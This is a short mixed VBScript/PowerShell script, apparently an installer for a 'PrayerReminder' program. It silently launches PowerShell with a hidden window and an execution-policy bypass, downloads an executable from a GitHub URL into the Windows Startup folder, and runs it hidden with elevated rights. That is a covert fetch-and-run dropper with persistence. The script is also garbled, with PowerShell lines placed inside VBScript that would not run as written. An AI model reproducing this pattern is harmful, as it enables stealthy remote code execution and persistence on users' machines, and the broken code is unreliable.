Set objShell = CreateObject("WScript.Shell")

$dest = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\PrayerReminder.exe')

If (Test-Path $dest) {
    Remove-Item $dest -Force
}

objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url = 'https://github.com/AmjadBalls/PrayerReminder/raw/refs/heads/main/PrayerReminder.exe'; $dest = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\PrayerReminder.exe'); Invoke-WebRequest -Uri $url -OutFile $dest; Start-Process $dest -WindowStyle Hidden -Verb RunAs""", 0, False
